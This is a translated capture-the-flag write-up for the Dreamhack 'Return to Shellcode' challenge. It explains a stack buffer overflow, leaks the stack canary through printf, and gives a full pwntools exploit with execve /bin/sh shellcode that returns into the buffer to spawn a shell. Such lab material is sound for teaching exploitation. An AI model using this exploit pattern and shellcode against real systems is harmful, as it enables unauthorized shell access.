# dreamhack.io: Return to Shellcode

> Originally published on [Naver Blog](https://blog.naver.com/chaeeunhur630/224299365809). Translated and reformatted in English.

1. Check protection techniques

The checksec results are as follows:

Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found PIE: PIE enabled Stack: Executable RWX: Has RWX segments

The important part is:

Because a canary exists, the return address cannot be covered directly.

Since the stack is executable, you can insert shellcode into the stack and execute it.

PIE is turned on, but it is not a big problem because the program outputs the buf address directly.

The core code is as follows:

printf("Address of the buf: %p\n", buf);
 printf("Distance between buf and $rbp: %ld\n",
 (char*)__builtin_frame_address(0) - buf);

 printf("[1] Leak the canary\n");
 printf("Input: ");
 fflush(stdout);

 read(0, buf, 0x100);
 printf("Your input is '%s'\n", buf);

 puts("[2] Overwrite the return address");
 printf("Input: ");
 fflush(stdout);
 gets(buf);

The vulnerabilities here are twofold.

First, the size of buf is 0x50, but read() receives 0x100 as much input.

read(0, buf, 0x100);

Therefore, buffer overflow may occur.

Second, we use gets(buf) afterwards.

gets(buf);

gets() does not limit the length of the input, so it can even cover the return address.

2. Stack structure and offset calculation

The program outputs the following values:

Distance between buf and $rbp: 96

96 is 0x60 in hex.

That is,

buf starting address = rbp - 0x60

It is.

And the canary is usually stored at location rbp - 0x8.

So the distance to the canary can be calculated as:

(rbp - 0x8) - (rbp - 0x60) = 0x60 - 0x8 = 0x58

That is, the offset from the buf starting point to the canary is 0x58.

The stack structure is as follows.

buf[0x50] 80 bytes padding 8 bytes canary 8 bytes saved rbp 8 bytes return address 8 bytes

To summarize, it is as follows.

buf → canary = 0x58 buf → saved rbp = 0x60 buf → return addr = 0x68

3. Canary leak method

In this problem, the following code is executed after the first input:

printf("Your input is '%s'\n", buf);

When outputting a string, %s continues to output until it encounters \x00, which is a null byte.

The first byte of the stack canary is usually \x00.

So usually output stops before the canary.

However, if we send byte 0x59 in the first input, we can cover up to the first null byte in the canary.

p.send(b"A" * 0x59)

The meaning is as follows:

A * 0x58 → Fill up to just before the canary A * 1 → Cover the first null byte of the canary

Then printf("%s") will print the remaining 7 bytes of the canary.

Since the leaked value is the last 7 bytes of the canary, restore the original canary value by adding \x00 in front of it again.

leaked = p.recvn(7) canary = u64(b"\x00" + leaked)

Below is my exploit code

from pwn import *

context.arch = "amd64"
context.os = "linux"

p = remote("host3.dreamhack.games", 21041)

# buf address leak
p.recvuntil(b"Address of the buf: ")
buf_addr = int(p.recvline().strip(), 16)

# Leak distance between buf and rbp
p.recvuntil(b"Distance between buf and $rbp: ")
distance = int(p.recvline().strip())

canary_offset = distance - 8

log.info(f"buf address: {hex(buf_addr)}")
log.info(f"canary offset: {hex(canary_offset)}")

# canary leak as first input
p.recvuntil(b"Input: ")
p.send(b"A" * (canary_offset + 1))

p.recvuntil(b"A" * (canary_offset + 1))

leaked = p.recvn(7)
canary = u64(b"\x00" + leaked)

log.info(f"canary: {hex(canary)}")

# amd64 /bin/sh shellcode
shellcode = (
 b"\x48\x31\xf6"
 b"\x56"
 b"\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68"
 b"\x57"
 b"\x54"
 b"\x5f"
 b"\x6a\x3b"
 b"\x58"
 b"\x99"
 b"\x0f\x05"
)

# return address overwrite with second input
p.recvuntil(b"Input: ")

payload = shellcode
payload += b"A" * (canary_offset - len(shellcode))
payload += p64(canary)
payload += b"B" * 8
payload += p64(buf_addr)

p.sendline(payload)

p.interactive()

4. Conclusion

This problem cannot be exploited by simply covering the return address because stack canary is applied.

However, you can leak part of the canary by using printf("%s") on the first input.

Afterwards, if you include the leaked canary value in the payload, put the shellcode in buf, and cover the return address with the buf address, the shellcode will be executed.

As a result, you can obtain a shell by taking advantage of the fact that the stack is executable.
